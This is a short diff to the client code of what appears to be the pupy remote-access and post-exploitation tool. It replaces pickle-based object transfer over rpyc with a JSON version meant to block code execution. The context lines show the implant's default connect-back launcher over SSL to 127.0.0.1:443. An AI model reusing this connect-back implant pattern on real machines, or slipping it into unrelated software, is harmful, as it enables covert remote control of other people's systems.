@@ -90,6 +90,19 @@ except ImportError, e:
 
 pupy.infos = {}  # global dictionary to store informations persistent through a deconnection
 
+def safe_obtain(proxy):
+    """ safe version of rpyc's rpyc.utils.classic.obtain, without using pickle. """
+    if type(proxy) in [list, str, bytes, dict, set, type(None)]:
+        return proxy
+    conn = object.__getattribute__(proxy, "____conn__")()
+    return json.loads(conn.root.json_dumps(proxy)) # should prevent any code execution
+
+def obtain(proxy):
+    """ allows to convert netref types into python native types """
+    return safe_obtain(proxy)
+
+setattr(pupy, 'obtain', obtain) # I don't see a better spot to put this util
+
 LAUNCHER = "connect"  # the default launcher to start when no argv
 # default launcher arguments
 LAUNCHER_ARGS = shlex.split("--host 127.0.0.1:443 --transport ssl")
